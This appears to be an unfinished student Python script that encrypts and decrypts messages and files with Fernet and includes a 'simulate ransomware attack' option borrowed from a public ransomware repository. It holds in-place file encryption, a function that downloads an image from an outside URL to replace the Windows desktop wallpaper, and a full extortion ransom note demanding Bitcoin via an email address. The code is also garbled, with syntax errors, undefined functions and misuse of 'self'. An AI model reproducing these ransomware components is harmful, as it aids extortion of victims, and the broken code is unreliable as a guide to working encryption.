#!/usr/bin/env python3

# Script Name:               File Encryption
# Author:                    Gerald
# Date of latest revision:   7/17/2023
# Purpose:                   
# Instructions:   
#Prompt the user to select a mode:
# could do user = input("Please select an option:" ) and put it all in an if statement
#Encrypt a file (mode 1)
# figure out
#Decrypt a file (mode 2)
# figure out
#Encrypt a message (mode 3)
# figure out
#Decrypt a message (mode 4)
# figure out
#If mode 1 or 2 are selected, prompt the user to provide a filepath to a target file.
# path = input("Input file path:")
#If mode 3 or 4 are selected, prompt the user to provide a cleartext string.
# cleartext_string = input (Input a cleartext string:)
#Encrypt the target file if in mode 1.
#Delete the existing target file and replace it entirely with the encrypted version.
#Decrypt the target file if in mode 2.
#Delete the encrypted target file and replace it entirely with the decrypted version.
#Encrypt the string if in mode 3.
#Print the ciphertext to the screen.
#Decrypt the string if in mode 4.
#Print the cleartext to the screen
#   nest the functions in an if statement

# Sources:
# https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python
# used Marcos demo to help build some parts
# https://github.com/ncorbuk/Python-Ransomware/blob/master/RansomWare.py#L138
# ChatGPT helped with some errors so any function that has old was rewritten by ChatGPT
    # not really sure what some of the errors are so seem to have just taken out the pseudo code

# Imported Libraries:
from cryptography.fernet import Fernet

# import os for walk command
import os

# this library allows you to download an image 
import urllib.request

# imports date time for ransom note
import datetime

# Functions:
def make_keyold():
    # stores generated key as a variable
    key = Fernet.generate_key()
    # Open the file named "key.key" in binary mode ("wb") to write the key
    with open("key.key", "wb") as key_file:
        # Write the key to the file in binary format
        key_file.write(key)



def load_keyold():
    # opens and reads in binary format then returns the contents of the file
    return open("key.key", "rb").read()

def load_key():
    return open("key.key", "rb").read()

# defines a function to encrypt messages
def encrypt_message():
    message = input("Please type the message to encode: ")
    # takes the message user inputted variable and encrypts it
    message_encrypted = message.encode()
    # initialize the Fernet class (taken from site dont quite understand it)
    f = Fernet(key)
    # stores the encrypted message as a variable 
    encrypted = f.encrypt(message_encrypted)

def decrypt_message():
    message = input("Type message to decrypt: ")
    message_decrypted = str.encode(message)
    f = fernet(key)
    decrypting = f.decrypt(message_decrypted)
    # initialize the Fernet class (taken from site dont quite understand it)
    f = Fernet(key)
    # save decrypting message as a variable
    decrypted_encrypted_message = f.decrypt(message)

def encrypt_file():
    f = fernet(key)
    path = input("Path of file to encrypt: ")
    with open(path, "rb") as file: 
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open (path, "wb") as file 
        file.write(encrypted_data)
        
def decrypt_file():
    f = fernet(key)
    path = input("Input path of file to decrypt")
    with open(path, "rb") as file
        file_data = file.read()

    decrypted_file = f.decrypt(file_data)

    with open (path, "wb") as file:
        file.write(decrypted_file)
    
def menu():
    user = input("Press 1 to encrypt message\nPress 2 to decrypt message\n Press 3 to encrypt file\n Press 4 to decrypt file\nPress 5 to simulate ransomware attack")
    if user == "1":
        encrypt_message()
    elif user == "2":
        decrypt_message()
    elif user == "3":      
        encrypt_file()
    elif user == "4":
        decrypt_file()
    elif user == "5":
        change_desktop_background()
    else:
        print("Not a valid input")



def check_keyold():
    if exists ("key.key") == true
        load_key
    else  
        make_key
        load_key

def check_key():
    if os.path.exists("key.key"):
        load_key()
    else:
        make_key()
        load_key()

  def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}Desktop/background.jpg'
        # uses imported library to get an image from the image url variable and save it to the location set in the path variable
        urllib.request.urlretrieve(imageUrl, path)
        # dunno
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')

# Variables:

# stores load key function as a variable
key = load_key


# Main:
check_key()
menu()


# calls the make_key function defined earlier

